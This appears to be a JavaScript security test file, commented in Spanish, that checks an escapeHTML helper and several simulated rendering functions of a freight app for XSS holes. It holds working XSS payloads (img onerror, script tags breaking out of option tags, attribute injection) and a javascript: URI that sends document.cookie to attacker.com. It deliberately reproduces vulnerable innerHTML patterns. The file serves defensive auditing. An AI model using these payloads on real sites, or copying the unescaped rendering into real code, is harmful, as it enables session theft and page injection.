// tests/test_xss_vectors.js
// Prueba hostil y adversarial de sanitización e inyección XSS en TerMate

function escapeHTML(str) {
    if (str === null || str === undefined) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

const failures = [];

console.log('=== TEST 1: Comportamiento de escapeHTML con tipos no primitivos y payloads hostiles ===');

// 1.1 Object.create(null)
try {
    const dangerousObj = Object.create(null);
    escapeHTML(dangerousObj);
    failures.push('Fallo 1.1: Object.create(null) debió lanzar o ser manejado sin explotar.');
} catch (e) {
    console.log('[CONFIRMADO VULNERABILIDAD] escapeHTML lanza excepción fatal con Object.create(null):', e.message);
}

// 1.2 Backticks para template literals
const backtickPayload = '`+alert(1)+`';
const escapedBacktick = escapeHTML(backtickPayload);
if (escapedBacktick.includes('`')) {
    console.log('[CONFIRMADO RIESGO] escapeHTML no escapa backticks (`). Si se inserta en eval/template string genera inyección.');
}

// 1.3 Inyección de atributos sin comillas
const attrPayload = 'x onfocus=alert(1) autofocus';
const escapedAttr = escapeHTML(attrPayload);
if (escapedAttr === attrPayload) {
    console.log('[CONFIRMADO RIESGO] escapeHTML no protege contra inyección en atributos HTML sin comillas:', escapedAttr);
}

// 1.4 javascript: URI bypass
const jsUriPayload = 'javascript:fetch("https://attacker.com/steal?c="+document.cookie)';
const escapedJsUri = escapeHTML(jsUriPayload);
if (escapedJsUri === jsUriPayload) {
    console.log('[CONFIRMADO RIESGO] escapeHTML no filtra esquemas URI peligrosos (javascript:, data:):', escapedJsUri);
}

console.log('\n=== TEST 2: Lugares críticos en TerMate con innerHTML SIN sanitizar ===');

// Simulamos los lugares exactos de app.js
const xssPayload = '<img src=x onerror="alert(document.domain)">';

// 2.1 abrirDetalle (Líneas 1125-1143 de app.js)
function simularAbrirDetalle(envio, camion) {
    const contRows = [
        ['Origen de Carga', envio.origen],
        ['Destino de Descarga', envio.destino],
        ['Descripcion de Carga', envio.producto],
        envio.pesoCarga ? ['Peso', `${envio.pesoCarga} tn`] : null,
        ['Estado', envio.estado],
        camion ? ['Camion Asignado', `${camion.nombre} (${camion.patente || 'S/P'})`] : null,
        camion?.camionero ? ['Chofer', camion.camionero] : null,
        envio.cliente ? ['Cliente / Receptor', envio.cliente] : null,
        envio.remito ? ['N° Remito Oficial', envio.remito] : null
    ].filter(Boolean).map(([k, v]) => `
        <div class="detail-row">
            <span class="detail-key">${k}</span>
            <span class="detail-val">${v}</span>
        </div>
    `).join('');
    return contRows;
}

const htmlDetalle = simularAbrirDetalle({
    origen: xssPayload,
    destino: 'Rosario, Santa Fe',
    producto: xssPayload,
    estado: 'Pendiente',
    cliente: xssPayload,
    remito: xssPayload
}, {
    nombre: xssPayload,
    patente: 'AAA111',
    camionero: xssPayload
});

if (htmlDetalle.includes(xssPayload)) {
    console.log('[VULNERABILIDAD CRÍTICA XSS ENCONTRADA]: abrirDetalle() inyecta directamente strings maliciosos en innerHTML sin escapeHTML!');
}

// 2.2 abrirPerfilCamionero (Líneas 1076-1105)
function simularPerfilCamionero(cnr, camionAsig) {
    return `
        <div>
            <div>${cnr.nombre}</div>
        </div>
        <div class="detail-rows">
            ${cnr.dni ? `<div class="detail-row">${cnr.dni}</div>` : ''}
            ${cnr.tel ? `<div class="detail-row">${cnr.tel}</div>` : ''}
            ${cnr.carnetNum ? `<div class="detail-row">${cnr.carnetNum}</div>` : ''}
            ${camionAsig ? `<div class="detail-row">${camionAsig.nombre}</div>` : ''}
        </div>
    `;
}

const htmlPerfil = simularPerfilCamionero({
    nombre: xssPayload,
    dni: xssPayload,
    tel: xssPayload,
    carnetNum: xssPayload
}, {
    nombre: xssPayload
});

if (htmlPerfil.includes(xssPayload)) {
    console.log('[VULNERABILIDAD CRÍTICA XSS ENCONTRADA]: abrirPerfilCamionero() inyecta datos de choferes en innerHTML sin escapeHTML!');
}

// 2.3 renderListaCamiones (Líneas 932-949)
function simularListaCamiones(cam) {
    return `
        <div class="camion-card">
            <span>${cam.nombre}</span>
            <span>${cam.patente || 'SIN PATENTE'}</span>
            ${cam.camionero ? `<div>${cam.camionero}</div>` : ''}
        </div>
    `;
}

const htmlCamion = simularListaCamiones({
    nombre: xssPayload,
    patente: xssPayload,
    camionero: xssPayload
});

if (htmlCamion.includes(xssPayload)) {
    console.log('[VULNERABILIDAD CRÍTICA XSS ENCONTRADA]: renderListaCamiones() inyecta datos de flota en innerHTML sin escapeHTML!');
}

// 2.4 renderSelectCamiones y renderSelectCamioneros
function simularSelects(camiones, camioneros) {
    const selCam = camiones.map(c => `<option value="${c.id}">${c.nombre} (${c.patente || 'S/P'})</option>`).join('');
    const selCnr = camioneros.map(c => `<option value="${c.id}">${c.nombre} (DNI ${c.dni || 'S/D'})</option>`).join('');
    return { selCam, selCnr };
}

const selectsHtml = simularSelects(
    [{ id: 1, nombre: '</option><script>alert("camion")</script>', patente: 'XYZ' }],
    [{ id: 1, nombre: '</option><script>alert("chofer")</script>', dni: '123' }]
);

if (selectsHtml.selCam.includes('<script>') || selectsHtml.selCnr.includes('<script>')) {
    console.log('[VULNERABILIDAD CRÍTICA XSS ENCONTRADA]: renderSelectCamiones / renderSelectCamioneros permiten inyección en tags <option>!');
}

// 2.5 setupAutocompletado (Línea 773)
function simularAutocompletado(sugs) {
    return sugs.map(s => `
        <li role="option" data-lat="${s.lat}" data-lon="${s.lon}" data-completo="${s.completo}">
            <div class="sug-main-row"><span class="sug-principal">${s.principal}</span></div>
            <div class="sug-sub-row"><span class="sug-secundario">${s.secundario}</span></div>
        </li>
    `).join('');
}

const sugsMaliciosos = [{
    lat: -34.6,
    lon: -58.4,
    completo: 'Calle " onfocus="alert(\'OSM injection\')" tabindex="1',
    principal: '<b onmouseover=alert(1)>Capital Federal</b>',
    secundario: '<script>alert(2)</script>'
}];

const htmlSugs = simularAutocompletado(sugsMaliciosos);
if (htmlSugs.includes('<script>') || htmlSugs.includes('<b onmouseover') || htmlSugs.includes('tabindex="1"')) {
    console.log('[VULNERABILIDAD CRÍTICA XSS ENCONTRADA]: setupAutocompletado inyecta sugerencias de Nominatim sin sanitizar ni escapar atributos!');
}
